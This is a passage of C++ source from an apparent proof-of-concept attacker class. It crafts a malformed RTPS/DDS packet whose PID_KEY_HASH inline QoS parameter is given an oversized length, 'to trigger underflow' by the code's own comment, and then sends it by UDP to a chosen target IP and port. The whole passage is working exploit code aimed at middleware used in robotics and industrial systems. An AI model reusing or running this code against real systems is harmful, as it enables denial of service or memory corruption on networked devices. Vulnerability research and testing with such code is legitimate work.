    for (int j = 0; j < 4; ++j) {
      rtps_message.push_back(static_cast<char>((sample_size >> (j * 8)) & 0xFF));
    }

    // Inline QoS data (large to trigger underflow)
    std::vector<char> inline_qos_data;
    
    // Create a submessage as parameter content
    std::vector<char> submessage_data;
    submessage_data.push_back(0x09); // INFO_TS
    submessage_data.push_back(0x01); // Flags
    submessage_data.push_back(0x08); // Length
    submessage_data.push_back(0x00);
    for (int j = 0; j < 8; ++j) {
      submessage_data.push_back(timestamp[j]);
    }

    std::string large_param(submessage_data.begin(), submessage_data.end());

    // Parameter ID (PID_KEY_HASH = 0x0050)
    uint16_t param_id = 0x0050;
    inline_qos_data.push_back(static_cast<char>(param_id & 0xFF));
    inline_qos_data.push_back(static_cast<char>((param_id >> 8) & 0xFF));

    // Parameter length
    uint16_t param_length = large_param.length() * 3;
    inline_qos_data.push_back(static_cast<char>(param_length & 0xFF));
    inline_qos_data.push_back(static_cast<char>((param_length >> 8) & 0xFF));

    // Parameter data (3 copies)
    inline_qos_data.insert(inline_qos_data.end(), large_param.begin(), large_param.end());
    inline_qos_data.insert(inline_qos_data.end(), large_param.begin(), large_param.end());
    inline_qos_data.insert(inline_qos_data.end(), large_param.begin(), large_param.end());

    // 4-byte alignment
    size_t current_size = inline_qos_data.size();
    size_t aligned_size = (current_size + 3) & ~3;
    while (inline_qos_data.size() < aligned_size) {
      inline_qos_data.push_back(0x00);
    }

    // PID_SENTINEL
    inline_qos_data.push_back(0x01);
    inline_qos_data.push_back(0x00);
    inline_qos_data.push_back(0x00);
    inline_qos_data.push_back(0x00);

    // Add inline QoS to message
    rtps_message.insert(rtps_message.end(), inline_qos_data.begin(), inline_qos_data.end());
  }

  return rtps_message;
}

bool POCAttacker::sendPOCPacket(const std::vector<char>& packet, const std::string& target_ip, int target_port)
{
  int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
  if (sockfd < 0) {
    std::cerr << "Failed to create socket: " << strerror(errno) << std::endl;
    return false;
  }

  struct sockaddr_in dest_addr;
  std::memset(&dest_addr, 0, sizeof(dest_addr));
  dest_addr.sin_family = AF_INET;
  dest_addr.sin_addr.s_addr = inet_addr(target_ip.c_str());
  dest_addr.sin_port = htons(target_port);

  ssize_t bytes_sent = sendto(sockfd, packet.data(), packet.size(), 0,
                              (struct sockaddr*)&dest_addr, sizeof(dest_addr));

  close(sockfd);

  if (bytes_sent < 0) {
    std::cerr << "Failed to send packet: " << strerror(errno) << std::endl;
    return false;
  }

  std::cout << "POC Attacker: Sent " << bytes_sent << " bytes to " 
            << target_ip << ":" << target_port << std::endl;
  return true;
}

